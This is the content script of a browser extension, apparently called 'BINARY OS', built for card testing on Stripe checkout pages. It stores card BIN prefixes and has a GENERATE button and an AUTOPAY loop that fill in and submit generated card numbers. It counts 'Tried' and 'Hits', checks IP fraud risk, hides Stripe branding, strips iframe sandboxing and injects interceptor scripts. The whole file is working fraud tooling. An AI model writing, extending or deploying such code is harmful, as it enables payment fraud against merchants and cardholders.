const DEFAULT_SETTINGS = {
  binList: [],
  bin1: "3743551236",
  bin2: "",
  cardDetails: [],
  generateButtonId: "generateCardButton",
  extensionEnabled: !0,
  binMode: !0,
  userName: "",
  userEmail: "",
  userAddress: "",
  userCity: "",
  userZip: "",
  useCustomBilling: !1,
  customName: "",
  customEmail: "",
  customStreet: "",
  customCity: "",
  customPostalCode: "",
  customCountry: "",
  telegramName: "",
  hittedSites: [],
  sendSiteToGroup: !1,
  // New feature toggles (mirrored from dashboard)
  multiGatewayEnabled: !0,
  hideStripeAgent: !1,
  skipStripeZipValidation: !1,
  playHitSound: !0,
};
let autopayInterval,
  state = {
    settings: { ...DEFAULT_SETTINGS },
    lastUsedCard: "",
    settingsLoaded: !1,
    extensionEnabled: !0,
    lastGeneratedCardDetails: null,
    cardIndex: 0,
    attemptCount: 0,
    successCount: 0,
    autopayEnabled: !1,
    currentSiteInfo: { name: "Unknown", url: "Unknown" },
  };
function injectScript(e) {
  const t = document.createElement("script");
  ((t.src = chrome.runtime.getURL(e)),
    (t.onload = () => t.remove()),
    (document.head || document.documentElement).appendChild(t));
}
function isMobile() {
  return /Mobi|Android|iPhone|iPad|iPod|Opera Mini|IEMobile/i.test(
    navigator.userAgent,
  );
}
function hideSiteDetails() {
  if (document.getElementById("binary-privacy-blur")) return;
  const e = document.createElement("style");
  ((e.id = "binary-privacy-blur"),
    (e.textContent =
      "\n    /* Blur these specific Stripe/Replit elements */\n    .App-header,\n    .Link--primary,\n    .ProductSummary-name,\n    .ProductSummary-subscriptionDescription,\n    .LineItem-imageContainer,\n    .LineItem-productName,\n    .LineItem-description,\n    .YGErOEoF__Subtotal, \n    .OrderDetailsFooter-subtotalItems,\n    .FadeWrapper, \n    ._5UMtXkiA__OrderDetailsSubtotalItem,\n    .BjJO-0hk__BusinessLink-backLabel,\n    .ProductSummary-amountsDescriptions {\n        filter: blur(6px) !important;\n        opacity: 0.5;\n        pointer-events: none;\n        user-select: none;\n        transition: all 0.3s ease;\n    }\n\n    /* Keep Money Visible */\n    #OrderDetails-TotalAmount,\n    #ProductSummary-totalAmount,\n    .OrderDetails-total,\n    .CurrencyAmount {\n        filter: none !important;\n        opacity: 1 !important;\n        font-weight: 700 !important;\n    }\n  "),
    document.head.appendChild(e));
}
function showSiteDetails() {
  const e = document.getElementById("binary-privacy-blur");
  e && e.remove();
}
document.addEventListener("DOMContentLoaded", () => {
  (injectScript("js/interceptor.js"), injectScript("js/stripe/injected.js"));
});
const bgColors = {
    "App-Overview": "#000000",
    "App-Payment": "#000000",
    "App-Background": "#000000",
    "Accordion ": "#000000",
  },
  textColors = {
    "App-Overview": "#ffffff",
    "Another-Class": "#ffcc00",
    "ProductSummary-name": "#ffffff",
    "App-Payment": "#ffffff",
    PaymentHeader: "#ffffff",
    "PaymentMethod-Heading": "#ffffff",
  };
function applyDarkMode() {
  if (!isMobile()) {
    (document.body.style.setProperty("--skeleton-bg-color", "#000000"),
      (document.body.style.backgroundColor = "#000000"),
      (document.body.style.color = "#ffffff"));
    for (const [e, t] of Object.entries(bgColors))
      document
        .querySelectorAll(`.${e}`)
        .forEach((e) => (e.style.backgroundColor = t));
    for (const [e, t] of Object.entries(textColors))
      document.querySelectorAll(`.${e}`).forEach((e) => (e.style.color = t));
    if (!document.getElementById("custom-pseudo-style")) {
      const e = document.createElement("style");
      ((e.id = "custom-pseudo-style"),
        (e.innerHTML =
          "\n .App-Container:not(.local-setup-mode)::before {\n background: #000000 !important;\n }\n "),
        document.head.appendChild(e));
    }
  }
  document.querySelectorAll("iframe").forEach((e) => {
    e.hasAttribute("sandbox") && e.removeAttribute("sandbox");
    const t = e.src || "",
      n = e.name || "";
    t.includes("stripe") ||
      n.startsWith("__privateStripe") ||
      t.includes("captcha") ||
      t.includes("challenge") ||
      t.includes("3ds") ||
      e.remove();
  });

  // Optionally hide Stripe branding / payment agent text
  hideStripeBrandingIfEnabled();
}

// Hide Stripe payment agent / branding elements when enabled in settings
function hideStripeBrandingIfEnabled() {
  try {
    if (!state.settings || !state.settings.hideStripeAgent) return;
    const candidates = [];
    document.querySelectorAll("footer, div, span, small, a").forEach((el) => {
      const txt = (el.textContent || "").toLowerCase();
      if (
        txt.includes("powered by stripe") ||
        txt.includes("payment agent") ||
        txt.includes("stripe, inc")
      ) {
        candidates.push(el);
      }
    });
    candidates.forEach((el) => {
      el.style.display = "none";
    });
  } catch (err) {
    // best-effort only
  }
}
isMobile() ||
  (setTimeout(applyDarkMode, 100),
  new MutationObserver(applyDarkMode).observe(document.body, {
    attributes: !0,
    subtree: !0,
    attributeFilter: ["style", "class"],
    childList: !0,
  }));
const log = (e, t, n = null) => {},
  debounce = (e, t) => {
    let n;
    return function (...o) {
      (clearTimeout(n),
        (n = setTimeout(() => {
          (clearTimeout(n), e(...o));
        }, t)));
    };
  },
  isCheckoutOrPaymentPage = () =>
    [
      /^pay\./,
      /checkout\.stripe\.com/,
      /^buy\.stripe/,
      /checkout/i,
      /stripe/i,
      /taskade/i,
      /billing/i,
    ].some(
      (e) =>
        e.test(window.location.hostname) || e.test(window.location.pathname),
    );
function setupMobileKeyboardFix() {
  if (!isMobile()) return;
  const e = "mobile-keyboard-fix";
  if (!document.getElementById(e)) {
    const t = document.createElement("style");
    ((t.id = e),
      (t.textContent =
        "\n    /* Hide FAB and Stats Pill when keyboard is open */\n    body.keyboard-active #mobileFab,\n    body.keyboard-active #mobileStatsPill,\n    body.keyboard-active .flux-panel-container {\n        display: none !important;\n        opacity: 0 !important;\n        pointer-events: none !important;\n        transition: opacity 0.1s;\n    }\n    \n    /* BUT KEEP NOTIFICATIONS VISIBLE */\n    body.keyboard-active .flux-container {\n        display: flex !important;\n        opacity: 1 !important;\n        pointer-events: auto !important;\n        top: 10px !important; /* Force to top */\n    }\n"),
      document.head.appendChild(t));
  }
  if (window.visualViewport) {
    const e = window.visualViewport.height,
      t = () => {
        const t = window.visualViewport.height;
        e - t > 150
          ? document.body.classList.add("keyboard-open")
          : document.body.classList.remove("keyboard-open");
      };
    (window.visualViewport.addEventListener("resize", t),
      window.visualViewport.addEventListener("scroll", t));
  }
  (document.addEventListener("focusin", (e) => {
    (["INPUT", "TEXTAREA"].includes(e.target.tagName) ||
      e.target.isContentEditable) &&
      document.body.classList.add("keyboard-open");
  }),
    document.addEventListener("focusout", (e) => {
      setTimeout(() => {
        const e = document.activeElement;
        "INPUT" === e.tagName ||
          "TEXTAREA" === e.tagName ||
          e.isContentEditable ||
          document.body.classList.remove("keyboard-open");
      }, 200);
    }));
}
function showNotification(e, t, n = null, o = 4e3) {
  const a = {
      success: { style: "success", title: "SUCCESS", icon: "check" },
      error: { style: "error", title: "DECLINED", icon: "x" },
      warning: { style: "warning", title: "WARNING", icon: "alert" },
      info: { style: "info", title: "INFO", icon: "info" },
      card_declined: { style: "error", title: "DECLINED", icon: "card_error" },
    },
    i = a[e] || a.info;
  let r = document.querySelector(".flux-container");
  if (!r) {
    ((r = document.createElement("div")),
      (r.className = "flux-container"),
      document.body.appendChild(r));
    const e = document.createElement("style");
    ((e.textContent =
      "\n      @import url('https://fonts.googleapis.com/css2?family=Libre+Baskerville:wght@400;700&display=swap');\n      .flux-container {\n        position: fixed; top: 20px; right: 20px; z-index: 2147483647;\n        display: flex; flex-direction: column; gap: 12px; pointer-events: none;\n      }\n      .flux-toast {\n        pointer-events: auto; position: relative; overflow: hidden; cursor: pointer;\n        font-family: 'Libre Baskerville', Georgia, serif; font-weight: 700;\n        background: rgba(255,255,255,0.07);\n        backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px);\n        border: 1px solid rgba(255,255,255,0.12);\n        border-radius: 16px;\n        box-shadow: 0 12px 40px rgba(0,0,0,0.35), 0 0 0 1px rgba(255,255,255,0.06) inset;\n        transition: all 0.3s ease;\n      }\n      .flux-content { padding: 14px; display: flex; flex-direction: column; gap: 8px; }\n      .flux-header { display: flex; align-items: center; gap: 10px; padding-bottom: 8px; border-bottom: 1px solid rgba(255,255,255,0.08); }\n      .flux-icon { width: 18px; height: 18px; color: var(--flux-color); }\n      .flux-title { font-size: 12px; font-weight: 700; color: #fff; letter-spacing: 0.5px; }\n      .flux-message { font-size: 11px; color: rgba(255,255,255,0.9); line-height: 1.4; font-weight: 700; }\n      .flux-card-badge {\n        background: rgba(255,255,255,0.06); backdrop-filter: blur(8px); border-radius: 10px;\n        padding: 8px; display: flex; align-items: center; gap: 8px;\n        border: 1px solid rgba(255,255,255,0.08);\n      }\n      .flux-card-icon { color: rgba(255,255,255,0.6); font-size: 10px; }\n      .flux-card-text { font-family: 'Libre Baskerville', serif; font-size: 11px; font-weight: 700; color: var(--flux-color); letter-spacing: 1px; }\n      .flux-toast.success { --flux-color: #00f260; border-color: rgba(0, 242, 96, 0.25); box-shadow: 0 12px 40px rgba(0,0,0,0.3), 0 0 20px rgba(0,242,96,0.08), 0 0 0 1px rgba(255,255,255,0.06) inset; }\n      .flux-toast.error { --flux-color: #ff0055; border-color: rgba(255, 0, 85, 0.25); box-shadow: 0 12px 40px rgba(0,0,0,0.3), 0 0 20px rgba(255,0,85,0.08), 0 0 0 1px rgba(255,255,255,0.06) inset; }\n      .flux-toast.warning { --flux-color: #f59e0b; border-color: rgba(245, 158, 11, 0.25); box-shadow: 0 12px 40px rgba(0,0,0,0.3), 0 0 20px rgba(245,158,11,0.08), 0 0 0 1px rgba(255,255,255,0.06) inset; }\n      .flux-toast.info { --flux-color: #2E9AFE; border-color: rgba(46, 154, 254, 0.25); box-shadow: 0 12px 40px rgba(0,0,0,0.3), 0 0 20px rgba(46,154,254,0.08), 0 0 0 1px rgba(255,255,255,0.06) inset; }\n      @media screen and (min-width: 601px) {\n        .flux-toast { width: 300px; border-radius: 16px; opacity: 0; transform: translateX(20px); animation: slideIn 0.35s forwards; }\n        @keyframes slideIn { to { opacity: 1; transform: translateX(0); } }\n      }\n      @media screen and (max-width: 600px) {\n        .flux-container { top: 10px; left: 50%; transform: translateX(-50%); right: auto; width: 95%; max-width: 400px; }\n        .flux-toast { width: 100%; border-radius: 18px; background: rgba(255,255,255,0.08); backdrop-filter: blur(24px); -webkit-backdrop-filter: blur(24px); border: 1px solid rgba(255,255,255,0.12); box-shadow: 0 12px 40px rgba(0,0,0,0.3), 0 0 0 1px rgba(255,255,255,0.06) inset; animation: mobileDrop 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards; }\n        @keyframes mobileDrop { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }\n        .flux-toast.hiding { animation: mobileUp 0.3s forwards; }\n        @keyframes mobileUp { to { opacity: 0; transform: translateY(-20px); } }\n      }\n    "),
      document.head.appendChild(e));
  }
  const s = document.createElement("div");
  s.className = `flux-toast ${i.style}`;
  const l = n
    ? `\n    <div class="flux-card-badge">\n        <span class="flux-card-icon">💳</span>\n        <span class="flux-card-text">${n}</span>\n    </div>`
    : "";
  ((s.innerHTML = `\n    <div class="flux-content">\n      <div class="flux-header">\n        ${{ check: '<svg class="flux-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg>', x: '<svg class="flux-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M18 6L6 18M6 6l12 12"/></svg>', alert: '<svg class="flux-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12" y2="16"/></svg>', info: '<svg class="flux-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4"/><path d="M12 8h.01"/></svg>', card_error: '<svg class="flux-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><rect x="2" y="5" width="20" height="14" rx="2"/><line x1="2" y1="10" x2="22" y2="10"/></svg>' }[i.icon]}\n        <div class="flux-title">${i.title}</div>\n      </div>\n      <div class="flux-message">${t}</div>\n      ${l}\n    </div>\n  `),
    r.appendChild(s));
  const c = () => {
    (s.classList.add("hiding"),
      setTimeout(() => {
        (s.remove(), r.children.length || r.remove());
      }, 400));
  };
  (o > 0 && setTimeout(c, o), s.addEventListener("click", c));
}
function updateIpRiskUI(data) {
  const ipEl = document.getElementById("binary-ip-display");
  const riskEl = document.getElementById("binary-risk-display");

  if (ipEl) ipEl.textContent = data.ip || "Unknown";

  if (riskEl) {
    riskEl.textContent = `${data.riskLabel} (${data.riskScore}%)`;
    // Color coding based on risk level
    riskEl.className = "risk-val " + (data.riskClass || "risk-low");

    if (data.riskClass === "risk-high")
      riskEl.style.color = "#ef4444"; // Red
    else if (data.riskClass === "risk-medium")
      riskEl.style.color = "#f59e0b"; // Orange
    else riskEl.style.color = "#22c55e"; // Green
  }
}
/* REPLACE addGenerateButton IN content-new.js */

function addGenerateButton() {
  // Prevent duplicate injection
  if (document.querySelector(".binary-panel-container")) return;

  // 1. INJECT STYLES (Includes binary Desktop & Mobile Flux)
  const style = document.createElement("style");
  style.textContent = `
    /* === VARIABLES === */
    :root {
      --gen-bg: #09090b;
      --gen-surface: #18181b;
      --gen-surface-hover: #27272a;
      --gen-border: #27272a;
      --gen-text: #fafafa;
      --gen-text-muted: #a1a1aa;
      --gen-primary: 59, 130, 246;
      --gen-accent: 34, 197, 94;
      --gen-shadow: rgba(0,0,0,0.5);
      --flux-font: 'Segoe UI', sans-serif;
    }

    /* === DESKTOP: binary PANEL === */
    .binary-panel-container {
      position: fixed; top: 20px; left: 20px; z-index: 2147483647;
      width: 240px;
      background: var(--gen-bg);
      border: 1px solid var(--gen-border);
      border-radius: 16px;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      box-shadow: 0 10px 30px -5px var(--gen-shadow), 0 8px 10px -6px var(--gen-shadow);
      display: flex; flex-direction: column;
      overflow: hidden;
      transition: height 0.3s ease, background 0.3s ease;
      animation: slideIn 0.4s cubic-bezier(0.16, 1, 0.3, 1) forwards;
    }
    @keyframes slideIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }

    .binary-header {
      display: flex; align-items: center; justify-content: space-between;
      padding: 12px 14px; background: var(--gen-surface);
      border-bottom: 1px solid var(--gen-border);
      cursor: move; user-select: none;
    }
    .header-branding { display: flex; align-items: center; gap: 8px; }
    .header-title { font-size: 13px; font-weight: 700; color: var(--gen-text); letter-spacing: 0.5px; }
    .header-controls { display: flex; gap: 6px; }
    .ctrl-btn {
      background: transparent; border: none; cursor: pointer; color: var(--gen-text-muted);
      padding: 4px; border-radius: 6px; display: flex; align-items: center; justify-content: center;
      transition: all 0.2s;
    }
    .ctrl-btn:hover { background: rgba(128,128,128,0.1); color: var(--gen-text); }

    .binary-content { padding: 14px; display: flex; flex-direction: column; gap: 12px; }
    .binary-panel-container.minimized .binary-content { display: none; }
    .binary-panel-container.minimized { width: auto; min-width: 200px; }
    .minimized-info { display: none; font-size: 11px; color: var(--gen-text-muted); margin-left: 10px; }
    .binary-panel-container.minimized .minimized-info { display: block; }

    .binary-user-row { display: flex; gap: 10px; align-items: center; }
    .binary-avatar { width: 36px; height: 36px; border-radius: 50%; border: 2px solid var(--gen-surface); }
    .binary-user-info { display: flex; flex-direction: column; }
    .binary-username { font-size: 13px; font-weight: 600; color: var(--gen-text); }
    .binary-status { font-size: 10px; color: rgb(var(--gen-primary)); font-weight: 500; }

    /* IP & RISK BOX (UPDATED WITH BLUR) */
    .binary-ip-box {
        background: var(--gen-surface); border: 1px solid var(--gen-border);
        border-radius: 8px; padding: 8px; display: flex; flex-direction: column; gap: 4px;
    }
    .ip-row { display: flex; justify-content: space-between; align-items: center; font-size: 11px; color: var(--gen-text-muted); }
    
    .ip-val { 
        font-family: monospace; color: var(--gen-text); font-weight: 700; 
        filter: blur(5px); cursor: pointer; transition: all 0.3s ease; user-select: none; 
    }
    .ip-val:hover { filter: blur(3px); } /* Slight reveal on hover */
    .ip-val.revealed { filter: blur(0); } /* Fully visible when toggled */
    
    .risk-val { font-weight: 700; }

    .binary-stats-bar {
      display: flex; background: var(--gen-surface); border: 1px solid var(--gen-border);
      border-radius: 10px; padding: 4px; gap: 2px;
    }
    .stat-segment {
      flex: 1; display: flex; flex-direction: column; align-items: center;
      padding: 6px; position: relative;
    }
    .stat-segment:first-child::after {
        content: ''; position: absolute; right: 0; top: 20%; height: 60%; width: 1px; background: var(--gen-border);
    }
    .stat-value { font-family: monospace; font-size: 18px; font-weight: 700; line-height: 1.1; }
    .stat-label { font-size: 9px; text-transform: uppercase; color: var(--gen-text-muted); font-weight: 700; }
    .stat-value.tried { color: var(--gen-text); }
    .stat-value.hits { color: rgb(var(--gen-accent)); text-shadow: 0 0 12px rgba(var(--gen-accent), 0.35); }

    #generateButton {
      background: rgb(var(--gen-primary)); color: #fff; border: none; padding: 12px;
      border-radius: 10px; font-weight: 700; font-size: 12px; cursor: pointer;
      display: flex; justify-content: center; align-items: center; gap: 8px;
      box-shadow: 0 4px 15px rgba(var(--gen-primary), 0.25);
      transition: all 0.2s;
    }
    #generateButton:hover { transform: translateY(-1px); box-shadow: 0 6px 20px rgba(var(--gen-primary), 0.35); }
    #generateButton:active { transform: scale(0.97); }

    .binary-option-row { display: flex; align-items: center; justify-content: space-between; padding: 2px 0; }
    .binary-option-label { font-size: 11px; color: var(--gen-text-muted); font-weight: 600; }

    .binary-toggle { position: relative; width: 32px; height: 18px; }
    .binary-toggle input { opacity: 0; width: 0; height: 0; }
    .toggle-track { 
      position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; 
      background: var(--gen-surface); border: 1px solid var(--gen-border); border-radius: 99px; transition: .3s; 
    }
    .toggle-track:before { 
      position: absolute; content: ""; height: 12px; width: 12px; left: 2px; bottom: 2px; 
      background: var(--gen-text-muted); transition: .3s; border-radius: 50%; 
    }
    input:checked + .toggle-track { background: rgba(var(--gen-primary), 0.15); border-color: rgb(var(--gen-primary)); }
    input:checked + .toggle-track:before { transform: translateX(14px); background: rgb(var(--gen-primary)); }

    /* === MOBILE: FLUX UI === */
    #mobileStatsPill, #mobileFab, #mobileMenu { display: none; }

    @media screen and (max-width: 600px) {
      .binary-panel-container { display: none !important; }

      #mobileStatsPill {
        display: flex !important; position: fixed; bottom: 20px; left: 20px; z-index: 2147483647;
        background: rgba(20,20,20,0.9); backdrop-filter: blur(20px);
        border: 1px solid rgba(255,255,255,0.1); border-radius: 18px;
        padding: 10px 14px; align-items: center; gap: 10px;
        box-shadow: 0 8px 32px rgba(0,0,0,0.3); font-family: var(--flux-font);
      }
      .pill-avatar { width: 34px; height: 34px; border-radius: 50%; border: 1px solid rgba(255,255,255,0.2); }
      .pill-content { display: flex; flex-direction: column; gap: 2px; }
      .pill-user { font-size: 11px; font-weight: 700; color: #fff; }
      .pill-stats-row { display: flex; gap: 8px; font-size: 9px; font-weight: 700; }
      .pill-stat { color: #aaa; }
      .pill-stat b { color: #fff; margin-left: 2px; }
      .pill-stat.success b { color: #4ade80; }
      .pill-sep { width: 1px; height: 8px; background: rgba(255,255,255,0.2); }

      #mobileFab {
        display: flex !important; position: fixed; bottom: 20px; right: 20px; z-index: 2147483647;
        width: 52px; height: 52px; border-radius: 50%;
        background: #3b82f6; color: #fff;
        align-items: center; justify-content: center;
        box-shadow: 0 8px 24px rgba(59, 130, 246, 0.4);
        cursor: pointer; transition: all 0.3s;
      }
      #mobileFab.open { transform: rotate(45deg); background: #fff; color: #000; }

      #mobileMenu {
        display: flex !important; flex-direction: column;
        position: fixed; bottom: 80px; right: 20px; z-index: 2147483646;
        background: #18181b; border: 1px solid #27272a; border-radius: 18px;
        padding: 14px; gap: 12px; width: 168px;
        opacity: 0; transform: translateY(20px) scale(0.95); pointer-events: none;
        transition: all 0.25s ease;
      }
      #mobileMenu.visible { opacity: 1; transform: translateY(0) scale(1); pointer-events: all; }

      .mobile-btn {
        background: rgba(59, 130, 246, 0.2); color: #60a5fa;
        border: 1px solid rgba(59, 130, 246, 0.4); padding: 12px; border-radius: 12px;
        font-weight: 700; font-size: 11px; font-family: var(--flux-font); cursor: pointer; width: 100%;
      }
      .mobile-row { display: flex; justify-content: space-between; align-items: center; padding: 0 4px; }
      .mobile-label { font-size: 11px; color: #a1a1aa; font-weight: 700; }
    }
  `;
  document.head.appendChild(style);

  // 2. CREATE PANEL STRUCTURE
  const container = document.createElement("div");
  container.className = "binary-panel-container";
  container.innerHTML = `
    <div class="binary-header" id="binaryDragHandle">
      <div class="header-branding">
        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="color:rgb(var(--gen-primary))"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
        <span class="header-title">BINARY OS</span>
        <span class="minimized-info" id="minimizedUsername"></span>
      </div>
      <div class="header-controls">
        <button class="ctrl-btn" id="minimizeBtn" title="Minimize">
          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="5" y1="12" x2="19" y2="12"></line></svg>
        </button>
      </div>
    </div>

    <div class="binary-content">
      <div class="binary-user-row">
        <img src="" id="fluxAvatar" class="binary-avatar">
        <div class="binary-user-info">
            <span id="fluxUsername" class="binary-username">Fetching...</span>
            <span class="binary-status" id="fluxUserStatus">Checking Access...</span>
        </div>
      </div>

      <div class="binary-ip-box">
        <div class="ip-row"><span>IP</span> <span id="binary-ip-display" class="ip-val" title="Click to reveal">...</span></div>
        <div class="ip-row"><span>RISK</span> <span id="binary-risk-display" class="risk-val">—</span></div>
      </div>
      
      <div class="binary-stats-bar">
        <div class="stat-segment">
            <span class="stat-value tried" id="binary-attempts-counter">0</span>
            <span class="stat-label">Tried</span>
        </div>
        <div class="stat-segment">
            <span class="stat-value hits" id="binary-success-counter">0</span>
            <span class="stat-label">Hits</span>
        </div>
      </div>
      
      <button id="generateButton">
        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
        GENERATE
      </button>
      
      <div class="binary-option-row">
        <span class="binary-option-label">AUTOPAY</span>
        <label class="binary-toggle"><input type="checkbox" id="autopayToggle"><span class="toggle-track"></span></label>
      </div>

      <div class="binary-option-row">
        <span class="binary-option-label">PRIVACY MODE</span>
        <label class="binary-toggle"><input type="checkbox" id="privacyToggle"><span class="toggle-track"></span></label>
      </div>
    </div>
  `;

  // 3. CREATE MOBILE ELEMENTS
  const mobilePill = document.createElement("div");
  mobilePill.id = "mobileStatsPill";
  mobilePill.innerHTML = `
    <img src="" id="mobileAvatar" class="pill-avatar">
    <div class="pill-content">
        <span id="mobileUsername" class="pill-user">Guest</span>
        <div class="pill-stats-row">
            <span class="pill-stat">TRY <b id="mobileTriedCount">0</b></span>
            <div class="pill-sep"></div>
            <span class="pill-stat success">HIT <b id="mobileHitsCount">0</b></span>
        </div>
    </div>`;

  const fab = document.createElement("div");
  fab.id = "mobileFab";
  fab.innerHTML =
    '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><line x1="12" y1="5" x2="12" y2="19"></line><line x1="5" y1="12" x2="19" y2="12"></line></svg>';

  const mobileMenu = document.createElement("div");
  mobileMenu.id = "mobileMenu";
  mobileMenu.innerHTML = `
    <button class="mobile-btn" id="mobileGenerateBtn">GENERATE CARD</button>
    <div class="mobile-row">
        <span class="mobile-label">AUTOPAY</span>
        <label class="binary-toggle"><input type="checkbox" id="mobileAutopayToggle"><span class="toggle-track"></span></label>
    </div>
    <div class="mobile-row">
        <span class="mobile-label">PRIVACY</span>
        <label class="binary-toggle"><input type="checkbox" id="mobilePrivacyToggle"><span class="toggle-track"></span></label>
    </div>`;

  document.body.appendChild(container);
  document.body.appendChild(mobilePill);
  document.body.appendChild(fab);
  document.body.appendChild(mobileMenu);

  // 4. EVENT LISTENERS

  // > Drag & Drop
  const header = document.getElementById("binaryDragHandle");
  let isDragging = false,
    startX,
    startY,
    initialLeft,
    initialTop;
  header.addEventListener("mousedown", (e) => {
    if (e.target.closest("button")) return;
    isDragging = true;
    startX = e.clientX;
    startY = e.clientY;
    const rect = container.getBoundingClientRect();
    initialLeft = rect.left;
    initialTop = rect.top;
    container.style.transition = "none";
    e.preventDefault();
  });
  document.addEventListener("mousemove", (e) => {
    if (!isDragging) return;
    container.style.left = `${initialLeft + (e.clientX - startX)}px`;
    container.style.top = `${initialTop + (e.clientY - startY)}px`;
  });
  document.addEventListener("mouseup", () => {
    isDragging = false;
    container.style.transition = "";
  });

  // > Minimize Panel
  document.getElementById("minimizeBtn").addEventListener("click", () => {
    container.classList.toggle("minimized");
  });

  // > Bind IP Click Reveal (NEW FEATURE)
  const ipDisplay = document.getElementById("binary-ip-display");
  if (ipDisplay) {
    ipDisplay.addEventListener("click", () => {
      ipDisplay.classList.toggle("revealed");
    });
  }

  // > Mobile FAB Toggle
  fab.addEventListener("click", (e) => {
    e.stopPropagation();
    fab.classList.toggle("open");
    mobileMenu.classList.toggle("visible");
  });
  document.addEventListener("click", (e) => {
    if (!mobileMenu.contains(e.target) && !fab.contains(e.target)) {
      mobileMenu.classList.remove("visible");
      fab.classList.remove("open");
    }
  });

  // > Counters Update Helper
  window.updateCountersUI = () => {
    const tried = typeof state !== "undefined" ? state.attemptCount || 0 : 0;
    const hits = typeof state !== "undefined" ? state.successCount || 0 : 0;
    // Desktop
    document.getElementById("binary-attempts-counter").textContent = tried;
    document.getElementById("binary-success-counter").textContent = hits;
    // Mobile
    const mTry = document.getElementById("mobileTriedCount");
    const mHit = document.getElementById("mobileHitsCount");
    if (mTry) mTry.textContent = tried;
    if (mHit) mHit.textContent = hits;
  };

  // > Fetch Profile & IP
  chrome.storage.sync.get(
    ["telegramName", "telegramPhotoUrl", "isVerified"],
    (data) => {
      const name = data.telegramName || "Guest User";
      const photo =
        data.telegramPhotoUrl ||
        `https://ui-avatars.com/api/?name=${encodeURIComponent(name)}&background=3B82F6&color=fff&bold=true`;

      // Update Desktop
      document.getElementById("fluxUsername").textContent = name;
      document.getElementById("minimizedUsername").textContent = name;
      document.getElementById("fluxAvatar").src = photo;
      const statusEl = document.getElementById("fluxUserStatus");
      if (data.isVerified) {
        statusEl.textContent = "Verified Access";
        statusEl.style.color = "rgb(var(--gen-accent))";
      } else {
        statusEl.textContent = "Unverified";
        statusEl.style.color = "#ef4444";
      }

      // Update Mobile
      document.getElementById("mobileUsername").textContent = name;
      document.getElementById("mobileAvatar").src = photo;
    },
  );

  // Request IP Data
  chrome.runtime.sendMessage({ action: "getIpAndRisk" }, (data) => {
    if (!chrome.runtime.lastError && data) updateIpRiskUI(data);
  });

  // > Unified Generate Action
  const handleGenerate = () => {
    if (!state.extensionEnabled) {
      showNotification("error", "Extension Disabled", "Turn on Master Switch.");
      return;
    }
    chrome.storage.sync.get(["isVerified"], (res) => {
      if (!res.isVerified) {
        showNotification("error", "Access Denied", "Verify Telegram first.");
        return;
      }
      if (state.autopayEnabled) {
        showNotification(
          "warning",
          "Autopay Active",
          "Disable autopay for manual gen.",
        );
        return;
      }

      if (typeof generateCardDetails === "function") generateCardDetails();
      if (typeof autoFillAndSubmit === "function") autoFillAndSubmit();

      const btn = document.getElementById("generateButton");
      const mBtn = document.getElementById("mobileGenerateBtn");
      const orig = btn.innerHTML;
      btn.innerHTML = "WORKING...";
      mBtn.innerText = "WORKING...";
      setTimeout(() => {
        btn.innerHTML = orig;
        mBtn.innerText = "GENERATE CARD";
      }, 1500);
    });
  };

  document
    .getElementById("generateButton")
    .addEventListener("click", handleGenerate);
  document
    .getElementById("mobileGenerateBtn")
    .addEventListener("click", handleGenerate);

  // > Sync Toggles
  const toggleAutopay = (checked) => {
    if (checked && !state.extensionEnabled) {
      document.getElementById("autopayToggle").checked = false;
      document.getElementById("mobileAutopayToggle").checked = false;
      showNotification("error", "Extension Disabled");
      return;
    }
    state.autopayEnabled = checked;
    document.getElementById("autopayToggle").checked = checked;
    document.getElementById("mobileAutopayToggle").checked = checked;

    if (checked) {
      if (typeof startAutopay === "function") startAutopay();
      showNotification("info", "Autopay Enabled");
    } else {
      if (typeof stopAutopay === "function") stopAutopay();
      showNotification("info", "Autopay Paused");
    }
  };

  const togglePrivacy = (checked) => {
    document.getElementById("privacyToggle").checked = checked;
    document.getElementById("mobilePrivacyToggle").checked = checked;
    if (checked) {
      if (typeof hideSiteDetails === "function") hideSiteDetails();
      showNotification("info", "Privacy ON");
    } else {
      if (typeof showSiteDetails === "function") showSiteDetails();
      showNotification("info", "Privacy OFF");
    }
  };

  document
    .getElementById("autopayToggle")
    .addEventListener("change", (e) => toggleAutopay(e.target.checked));
  document
    .getElementById("mobileAutopayToggle")
    .addEventListener("change", (e) => toggleAutopay(e.target.checked));
  document
    .getElementById("privacyToggle")
    .addEventListener("change", (e) => togglePrivacy(e.target.checked));
  document
    .getElementById("mobilePrivacyToggle")
    .addEventListener("change", (e) => togglePrivacy(e.target.checked));

  // Init State
  if (state.autopayEnabled) {
    document.getElementById("autopayToggle").checked = true;
    document.getElementById("mobileAutopayToggle").checked = true;
  }
}
function blurMain() {
  const e = document.querySelector(
    ".ReadOnlyFormField-email .ReadOnlyFormField-title",
  );
  e &&
    ((e.style.transition = "filter 0.3s ease"),
    (e.style.filter = "blur(5px)"),
    (e.style.cursor = "pointer"),
    (e.title = "Click to reveal/hide"),
    (e.onclick = () => {
      "blur(5px)" === e.style.filter
        ? (e.style.filter = "none")
        : (e.style.filter = "blur(5px)");
    }));
}
